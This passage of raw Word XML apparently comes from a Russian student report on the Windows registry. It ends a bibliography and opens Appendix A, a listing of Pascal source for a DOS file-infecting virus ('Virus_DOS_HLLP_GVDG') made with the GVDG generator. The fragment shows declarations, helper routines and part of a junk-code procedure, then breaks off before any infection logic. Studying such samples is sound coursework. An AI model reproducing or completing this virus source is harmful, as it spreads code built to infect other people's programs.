          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>, М. О. Калинин. – СПб</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>. :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> ПОЛИТЕХ-ПРЕСС, 2019. – 112 с.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD02239" w14:textId="4A535D12" w:rsidR="00C94588" w:rsidRDefault="00C94588" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="a4"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:ind w:left="0" w:firstLine="851"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C94588">
        <w:t>RegQueryValueA</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C94588">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C94588">
        <w:t>function</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C94588">
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C94588">
        <w:t>winreg.h</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C94588">
        <w:t xml:space="preserve">) </w:t>
      </w:r>
      <w:r w:rsidRPr="00A64D35">
        <w:t>[Электронный ресурс]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidRPr="00A64D35">
        <w:t>Режим доступа:</w:t>
      </w:r>
      <w:r w:rsidRPr="00C94588">
        <w:t xml:space="preserve"> https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvaluea</w:t>
      </w:r>
      <w:r w:rsidRPr="00A64D35">
        <w:t>, свободный.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B26481D" w14:textId="382015BC" w:rsidR="00C94588" w:rsidRDefault="00C94588" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="a4"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:ind w:left="0" w:firstLine="851"/>
      </w:pPr>
      <w:r w:rsidRPr="00C94588">
        <w:t xml:space="preserve">Просмотр реестра системы с помощью 64-битных версий Windows </w:t>
      </w:r>
      <w:r w:rsidRPr="00A64D35">
        <w:t>[Электронный ресурс]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidRPr="00A64D35">
        <w:t>Режим доступа:</w:t>
      </w:r>
      <w:r w:rsidRPr="00C94588">
        <w:t xml:space="preserve"> https://docs.microsoft.com/ru-ru/troubleshoot/windows-client/deployment/view-system-registry-with-64-bit-windows</w:t>
      </w:r>
      <w:r w:rsidRPr="00A64D35">
        <w:t>, свободный.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A0A9A92" w14:textId="0D8ECA63" w:rsidR="00900A6C" w:rsidRPr="00A64D35" w:rsidRDefault="00C94588" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="a4"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:ind w:left="0" w:firstLine="851"/>
      </w:pPr>
      <w:r w:rsidRPr="00C94588">
        <w:t>Реестр Windows</w:t>
      </w:r>
      <w:r w:rsidR="00900A6C" w:rsidRPr="00900A6C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00900A6C" w:rsidRPr="00A64D35">
        <w:t>[Электронный ресурс]</w:t>
      </w:r>
      <w:r w:rsidR="00900A6C">
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="00900A6C" w:rsidRPr="00A64D35">
        <w:t>Режим доступа:</w:t>
      </w:r>
      <w:r w:rsidR="00900A6C" w:rsidRPr="00900A6C">
        <w:t xml:space="preserve"> https://ru.wikipedia.org/wiki/Реестр_Windows</w:t>
      </w:r>
      <w:r w:rsidR="00900A6C" w:rsidRPr="00A64D35">
        <w:t>, свободный.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB8323F" w14:textId="77777777" w:rsidR="00AE1FDE" w:rsidRDefault="00D740EB" w:rsidP="004E5FC2">
      <w:pPr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2B6C7B8C" w14:textId="77777777" w:rsidR="00D740EB" w:rsidRDefault="00D740EB" w:rsidP="00D740EB">
      <w:pPr>
        <w:pStyle w:val="afb"/>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc35945238"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>ПРИЛОЖЕНИЕ А</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
    </w:p>
    <w:p w14:paraId="7BCC699F" w14:textId="589B7467" w:rsidR="00D740EB" w:rsidRPr="00EB2457" w:rsidRDefault="00D740EB" w:rsidP="00D740EB">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r w:rsidRPr="00A62693">
        <w:t>Листинг</w:t>
      </w:r>
      <w:r w:rsidRPr="00B45179">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B45179">
        <w:t>вируса</w:t>
      </w:r>
      <w:r w:rsidR="00B45179" w:rsidRPr="00B45179">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00B45179">
        <w:t xml:space="preserve"> созданного генератором </w:t>
      </w:r>
      <w:r w:rsidR="00B45179">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>GVDG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3600C5B9" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>{$M 65520,0,0}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56AE2A30" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">Program </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Virus_DOS_HLLP_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>GVDG</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="7295676C" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">USES </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>DOS;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="68ADA154" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>Const</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68130089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r w:rsidRPr="008231FF">
        <w:t>VirSize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>5090;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3C086CA0" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3BFC56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r w:rsidRPr="008231FF">
        <w:t>Bufer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>array[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>1..VirSize] of Char;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4C2A49" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>VAR</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36FF1174" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Victim :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> integer;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="724D6E4C" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">Procedure </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BeginEnd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> : integer);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8D4DAD" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>var</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AE9A743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n :integer</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C27EC5" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>Begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008625B6" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  case </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356157F0" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">        0..10000: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>n:=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72775B17" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    10001..20000: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>n:=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>i;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67EE82F1" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    20001..30000: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>n:=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>random(1000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44224A44" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7287F010" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    begin  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64117C16" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>n:=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD255F3" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>n:=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>random(65535);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59380BB7" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>n:=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>i</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56264D69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gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16749E7F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end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="12F13074" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>End;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="49DC7C1A" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">Function </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>IntToStr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>I : integer) : String;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A91C07F" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>Var</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="349293D1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S :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> String [5];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763D7DEF" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>Begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30151ED4" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Str(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>I, S);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354C7F29" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>IntToStr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>:=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>S;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B7210F" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>End;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="567C1C22" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">Procedure </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Musor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="72501C77" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>var</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0660F273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fch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> file of char;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5041EAEF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rch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> char;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BDEC5C5" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> char;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C55BC1A" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>st</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> string;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001E31BA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spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> integer;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21665ED9" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ii :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> integer;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F518019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iii :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> integer;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24AC426F" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7D5FD5" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>randomize;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="07D26179" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">for </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>i:=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>1 to random(10) do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF2126F" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB9FDFF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spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>st</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>:=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>'';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4351F907" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    for </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ii:=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>1 to random(5)+3 do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACB4FC5" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">      begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C00452" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>rch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>:=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>chr(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>ord</w:t>
      </w:r>
